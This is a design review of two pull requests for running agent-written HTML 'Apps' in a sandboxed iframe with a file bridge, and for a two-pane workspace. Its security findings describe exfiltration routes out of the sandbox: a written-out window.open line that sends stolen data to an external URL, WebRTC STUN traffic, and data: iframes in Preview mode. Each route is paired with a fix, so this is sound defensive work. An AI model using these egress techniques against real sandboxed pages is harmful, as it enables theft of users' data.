HTML apps that agents build, run beside the conversation

A review of Mahmoud's two design PRs and one sequenced plan that turns them into shippable work: an executable Run mode for agent-written HTML first, then a two-pane workspace to host it. In a hurry: the one-page summary covers all seven documents.

What an App is

An App is an ordinary HTML file that the agent wrote into the session's drive, opened in a mode where its own JavaScript is allowed to run. Nothing is uploaded or deployed. The file sits next to the agent's other files, and the "app" is what the user sees when Agenta executes it inside the playground instead of showing it as a static preview.

Today an HTML file in the drive has two views. Preview renders it with every script stripped, so it is safe but inert. Source shows the code. PR #6529 adds a third, Run, which executes the file in the same sandboxed iframe and hands it one small API, window.agenta.fs, that can read and write files in the app's own folder. The user chooses Run explicitly and picks what the app may touch.

The running example in both PRs is a todo board. The agent writes two files, todo.html and board.json. The user opens the HTML as an App beside the conversation, drags a card, and the App saves the new column layout to board.json. On the next turn the agent reads that file and sees what the user did. The App is the user's way to edit state that the agent also works with, without typing it into the chat.

Three terms the rest of this page relies on:

  • Run mode is the file viewer's third segment. It is a property of how an HTML file is opened, not a different kind of file. It lives in the file viewer, so it works anywhere a drive file can be shown.
  • The bridge is window.agenta.fs: a handful of file methods the page injects before the app's own code, backed by messages to the parent window. The App never holds a token or talks to the API directly.
  • An App tab is what PR #6775 adds: a tab in the second pane that holds an HTML file open in Run mode, so the user can use it while the conversation stays visible. Until that exists, Run mode works inside today's Files pane.
PR #6529 · Run mode + file bridge

Merge the doc after four amendments Build this first

The analysis of HtmlBody is accurate and the integration point is the smallest one available. The backend already has read, list, write and delete on mounts behind VIEW_MOUNTS / EDIT_MOUNTS, so the bridge is a frontend-only slice.

Amend: say which boundary the server holds. It bounds the mount (permission, project, no ..) and, since the egress findings, the granted folder too — a prefix-scoped token checked on every file call. PR #6775 · Workspace PRD + RFC

Merge PRD + RFC, drop the mockup source Re-scope

The layer model (workspace / tab view / resource / runtime) is right and matches how the code already separates the chat registry from React. The RFC names the mobile host only as an open question, yet /m already had SessionWorkspace on the same SplitPane and pane atoms a month before the RFC's pinned commit, and it is the target app.

Re-scope v1 so the second pane holds only non-session tabs. That ships the HTML-app loop without breaking the single-active-session assumption that shortcuts, hydration, URL sync and the files pane all depend on.

The one-line plan. Run mode lands in @agenta/entity-ui so both hosts get it for free. The workspace lands as a package hosted by desktop AgentChatPanel and mobile SessionWorkspace. The two are independent until the "app tab" joins them in phase 2.

Where we are

Today the desktop playground is three fixed columns. The middle column owns session tabs and the transcript. The Files pane on the right follows whichever session is active, and every consumer of "the session" reads one atom per chat scope.

Facts the plan rests on

  • HTML preview is already sandboxed. renderers.tsx inlines mount assets, strips every script vector, injects one nav interceptor, and renders through srcdoc with allow-scripts allow-popups allow-popups-to-escape-sandbox and no allow-same-origin.
  • The mounts API is complete for v1. GET /mounts/{id}/files?read= returns text, ?path= lists, PUT …/files?path= writes a raw body, DELETE …/files?path= removes. The Fern client exposes all four. Reads gate on VIEW_MOUNTS, writes on EDIT_MOUNTS.
  • Both hosts already share the pane state. chatPanelMaximizedAtom, configPanelCollapsedAtom, filesPaneWidthAtom live in @agenta/chat/state. Desktop's AgentChatPanel and mobile's SessionWorkspace both drive the kit SplitPane with them.
  • Chat runtimes already outlive React. sessionChats.ts keeps Chat instances in a module map keyed by session id; the desktop holds one while the tab is open. Callbacks rebind to the latest committing view.
  • Closing a running tab is a Stop. shouldCancelRunOnClose sends the cooperative cancel. The PRD proposes reversing this.
  • dnd-kit is a desktop dependency only. It is in web/oss/package.json, not in any package or in mobile.

Review: PR #6529, Run mode and the file bridge

The design is sound where it matters: explicit execution, opaque origin, no credential in the frame, narrow methods. The findings below are what I would change before treating the contract as a product API.

Findings

1
The server bounds the mount, not the folder. Say which boundary is which. (Superseded — the folder is a server boundary now.)

Kept as the record of what this review concluded and why it was wrong. The reasoning below rests on "the app has no way to get data out", which was disproved three times: popups, WebRTC, and a data: iframe in Preview. The folder rule now lives on the server as a prefix-scoped token (core/apps/scope_token.py) checked on every file call — so "today the answer is none" and "a later phase" no longer hold.

On every file call the server checks VIEW_MOUNTS / EDIT_MOUNTS, resolves the mount inside the project, and validate_file_path rejects absolute paths and any .. segment, so no request can escape the mount. It has no notion of a per-folder grant: the bridge's request is byte-identical to the user editing that file in the Files pane. Question 7 in the doc asks what server check guarantees folder scope; today the answer is none. That is acceptable for v1 because the app is agent-authored inside a drive the agent already owns, and the assets that matter (cookies, tokens, other projects) are isolated by the sandbox and the mount permission. The doc's "server remains the final authorization boundary" is true of the mount and should say so; folder scope is a client-side guardrail. A server-side scoped token is a later phase if apps ever become shareable.

2
Ship read and write together, behind one grant prompt.

A read-only slice proves the protocol but not the product loop, which is "the app updates board.json and the agent sees it". The write endpoint exists, is gated on EDIT_MOUNTS, and the parent already has the mount context. Read-only becomes the fallback grant level, not a separate release.

3
Use a MessageChannel port instead of parent.postMessage(…, "*").

The parent creates the channel, posts port2 into the iframe with the hello message, and thereafter talks only over that port. This removes the event.source check from every request, makes spoofing from a nested frame impossible, and gives you a clean "invalidate on remount" story: close the port, the old iframe is dead. The existing nav interceptor can move to the same port.

4
Name it window.agenta, version the contract, freeze error codes.

Generated HTML will hard-code the global; "arg" reads as a typo. Keep version: 1, and publish the error code set (scope, read_only, not_found, conflict, too_large, unavailable) as part of the contract, since apps will branch on them.

5
Tighten the Run sandbox and add a CSP.

Run needs neither popup flag: keep allow-scripts allow-forms and nothing else. Dropping allow-popups is what closes the app’s egress, not the CSP — see the egress surface below. Inject <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; form-action 'none'"> at the head of the assembled document so an app cannot pull external scripts. That answers question 5: external scripts no, inline yes, mount assets inlined as today.

5b
What actually stops an app reaching the network.

“The app cannot fetch anything” is the sentence the whole security model rests on, and default-src 'none' is not what delivers it. CSP’s fetch directives do not govern navigation, and navigate-to never shipped in any browser — so no CSP value blocks a popup. Only the sandbox attribute does.

With allow-popups set, an app could call window.open("https://…?d=" + stolen) synchronously inside any click it already handled, then close() the window. Verified against the real assembled document: with the flag, the listening server logged the request and the data; without it, nothing arrived. The exploit has to read its data before the click — an await first loses transient user activation and the popup blocker eats the open — which is not a hurdle.

Two consequences for later phases. An app that wants an external link does not get a popup: the click reaches the host as a nav message and the host decides, so the person sees the destination. And any future CSP relaxation is an egress decision rather than a convenience one — “let apps load a chart library from a CDN” reopens this, which is exactly why the library shelf inlines pinned builds at assembly instead.

And then WebRTC. ICE is not a fetch, so no CSP value governs it: a peer connection reached a public STUN server from inside this exact sandbox while every HTTP channel was blocked, and webrtc 'block' in a <meta> policy did nothing. Closed in the stub, which runs before app code.

And then Preview. Everything above is Run. The Preview tab renders ordinary drive HTML with allow-popups still set, and the reason that was thought safe is that it strips every agent script. The strip list never covered <iframe src="data:text/html,…"> — it only clears srcdoc — and the nested context inherits allow-scripts, so its script runs after the outer document has none left. Preview injected no CSP at all, so that script could simply fetch anywhere; the request arrived at a listening server with its query string intact. <object data="data:…"> and <embed> open the same door, so a longer strip list would have moved the vector rather than closed it. PREVIEW_CSP denies the capability instead: frame-src and object-src 'none' stop the nested contexts, default-src 'none' covers connect-src. It stays wider than RUN_CSP on style-src, img-src and font-src, because preview leaves external URLs alone and drive HTML that links a remote stylesheet or image has to keep rendering.

Three exits, each found by thinking of one more — and the third in the mode that looked least interesting. Enumerating exits against a browser does not terminate, which is why this list is a record of what is closed and never a proof that nothing is open — and why the folder rule is now enforced server-side as well. An app that cannot obtain bytes outside its folder makes the exit list stop being load-bearing. The list still matters, because an app can always leak the folder you granted it; the prefix check is what bounds the damage to what the person chose to show it.

6
Grant lifetime: keyed by folder and access level, remembered per browser session.

The grant does not vouch for a program; it says "code from this folder may read, or read and write, this folder", and any program running under it can reach exactly those files. So key it by mountId + folder + level in a module map, mirror it to sessionStorage so a reload does not re-prompt, and never write it into the persisted workspace layout. It survives edits to the app, which matters because the agent rewrites the file every turn during creation. Ask again only when the entry moves to another folder, when the app needs a higher level than granted, or when the browser session ends. The RFC already insists layout restore must not authorize execution; this satisfies it.

7
Close the loop back to the agent.

After a successful write, bump the drive generation (useDriveGeneration exists) so the explorer, file cards and the agent's next read all see the new bytes. Without this the Files pane shows a stale board.json next to a board that just changed.

9
Writes are unconditional at every layer. Add conflict detection, on by default.

The mounts API replaces an object without looking at what is there. The bridge inherits that, so the agent and an app can silently overwrite each other's board.json. The fix is optimistic concurrency: reads return an ETag, writes carry If-Match, a mismatch is a 412 with the current ETag. The bridge stub remembers the ETag of every file it read and sends it on every write without the app author doing anything; a rejected write surfaces as {code: "conflict"}. The agent's own writes go through the mounted filesystem, not the API, so they stay unconditional in v1; the app side still catches every collision because its write fails when the agent wrote in between. Store note: the bundled SeaweedFS bucket already has versioning enabled with a retention window, so file history exists at the store and can be exposed later.

8
Put the headless part in @agenta/entities, the UI in @agenta/entity-ui.

Path normalization, the grant store and the request handler are pure logic and want unit tests. The Run segment, the grant prompt and the iframe stay in renderers.tsx. Since DriveFileBody is what both hosts render, mobile gets Run mode with no host work.

Conflict detection, end to end

Three layers, each small. API: read and list responses carry etag; PUT and DELETE accept If-Match and If-None-Match: *; mismatch is 412 with the current ETag. The store's native conditional put turned out to be available, so that is what PUT uses: a real If-Match goes to the store and the service raises on a failed precondition. The stat-compare-put fallback this paragraph once proposed was never built, and should not be: a check followed by a write is not conditional, it only looks like it, and it would report success while erasing the write that landed in between. DELETE is the one place that compromise survives, because conditional DeleteObject is not portable across S3-compatible stores; the window is one round trip and the caller already holds the etag it wants gone, so the worst case is deleting a version it never saw. storage.py says so at the function. Bridge: the stub caches ETag per path on every read, sends it on every write and remove unless {force: true}, and rejects with conflict; a file never read is written unconditionally. Agent: unconditional in v1, since its tools go through the mounted filesystem; the skill tells it to read a data file right before writing it. A conditional write tool for agents is the v2 that closes the last side.

Refresh, designed in from the start

"The app cannot fetch anything" is the security model, and it stays. But "the data is stale until someone remembers" is a product problem, and it has four answers of increasing reach. The first two ship early; the last two are designed now so the manifest and the grant prompt never have to change to admit them.

Review: PR #6775, the workspace PRD and RFC

The RFC reads the current architecture correctly and its layer model is the one worth keeping. The issues are scope and host coverage, not direction.

Findings

1
The mobile host is named but not analyzed, and it is the target app.

The RFC's last open question asks where the workspace should live "so desktop changes preserve the mobile host", but its source entry points list only oss files. Mobile's SessionWorkspace.tsx landed on 8 Aug, a month before the RFC's pinned commit, and already used the same files pane and pane atoms. The answer to the open question has to be a package. /m already has SessionWorkspace.tsx on the same SplitPane with the same pane atoms and a tested resolveSessionPanes rule for phone widths. Any desktop-only implementation is debt on arrival. Build the workspace state and tab host in a package and mount it from both.

2
Sessions in both panes is the expensive part. Defer it to v2.

activeSessionIdAtomFamily(scope) feeds shortcuts, hydration, composer focus, the URL ?session_id= sync, the files pane and onboarding. Letting a session live in pane B means replacing that one atom with "selected per pane, focused pane, visible set, running set" across every consumer. v1: pane A keeps today's session tabs unchanged; pane B accepts file, explorer and app tabs only. That delivers the whole HTML-app story and the "discuss a document while viewing it" story with none of the identity rework.

3
Do not merge the mockup source.

It is a standalone Vite app with a 2,694-line package-lock.json, native drag-and-drop, and relative imports five directories up into agenta-ui. CodeRabbit's three findings (empty active tab after merging panes, openOther leaving pane 1 empty, composer focus ring removed) are real but only matter if the code is meant to live. Keep the hosted link and the two PNGs in the README; delete mockup/src, the lockfile and the build config from the PR.

4
Keep "close a running tab = Stop" in v1.

The PRD's proposal 6 reverses a deliberate decision (shouldCancelRunOnClose). It only makes sense once a session can have more than one view, which v1 does not allow. Revisit with duplicate views.

5
The one-pane merge rule needs a spec, not a fix.

CodeRabbit found the mockup selects an empty tab when collapsing to one pane. Specify it: merged order is pane A then pane B; selected tab is the focused pane's selection, else the other pane's, else the first tab.

6
Explorer tabs bind to a drive, and say which.

Today the Files pane follows the active session. In the workspace an explorer tab is pinned to the drive it was opened from and shows the session name in its title. "Follow focus" is an explicit later toggle, as the PRD says. The existing per-session openers (file card, chat link, staged drop) route through the workspace's open(resource, preferredPane) command instead of latching the pane flag.

7
Library call: generic two-pane on the kit, no Dockview.

Agreed with the RFC. Add @dnd-kit/core + sortable to the package (they are desktop-only deps today), keep the move-to-other-pane menu action as the keyboard path, and reuse the tab strip patterns from SessionTabStrip. Two panes is the product limit; nothing in the state shape should assume it, but nothing should build for N either.

Decisions needed

Mahmoud's questions, with a recommendation for each. Unblock phase 0 by confirming or overriding.

Is HtmlBody the right boundary?
Yes. Same iframe, same assembler, a third segment. A separate renderer would duplicate the asset inlining.
Read-only first, or writes too?
Both, one grant prompt. Writes are the product loop and the endpoint already exists behind EDIT_MOUNTS.
Which mounts client methods?
Fern: getMountFiles with read= for text and path= for list; writeMountFile; deleteMountFile. exists is a list of the parent filtered client-side.
Grant lifetime?
Keyed by folder and access level, remembered per browser session. Survives edits to the app. Never in workspace metadata or the persisted layout.
External scripts, images, styles?
No external scripts. CSP meta blocks them. Mount images and styles inlined as today; external images allowed via img-src https: if templates need them.
Popups in Run mode?
Neither. Drop allow-popups and allow-popups-to-escape-sandbox; add allow-forms. A popup is the one egress channel no CSP directive can close, and Run has no need of one — external links route through the host’s nav message.
Server-side folder guarantee?
Superseded — it is enforced now. The original answer was “none in v1, by design; a scoped token is phase 5 if apps become shareable”. That deferral rested on an app having no way to get data out, which proved false twice — popups, then WebRTC, each found by thinking of one more exit. Enumerating exits against a browser does not terminate, so the folder is now a server boundary: a prefix-scoped token (core/apps/scope_token.py) that the mounts router checks on every file call. It only narrows, so a call without one is an ordinary drive request and the Files pane is untouched.
Size caps?
4 MB per read, 1 MB per write, error too_large. Part of the contract, not the implementation.
Live data and refresh?
Tier 0 in phase 1, tier 1 in v1.1, tiers 2 and 3 designed only. The app never fetches. See "Refresh, designed in from the start".
Conflict detection on write?
Yes, in phase 1. ETag + If-Match in the API, sent automatically by the stub. App side only in v1; agent tools stay unconditional.
Public name and versioning?
window.agenta, version: 1, error codes frozen in the doc.
One or two panes, or N?
Two is the product limit. State shape does not encode it; UI does.
Config as a tab?
No. Config stays the left pane on both hosts. Revisit after phase 4.
Close a running conversation: stop or just close?
Stop, as today. Change only when a session can have two views.
Explorer pinned or following focus?
Pinned to its drive, session name in the tab. Follow-focus is a later explicit toggle.
Which kinds in v1?
file, explorer, app. Child agent, website and computer are not planned.
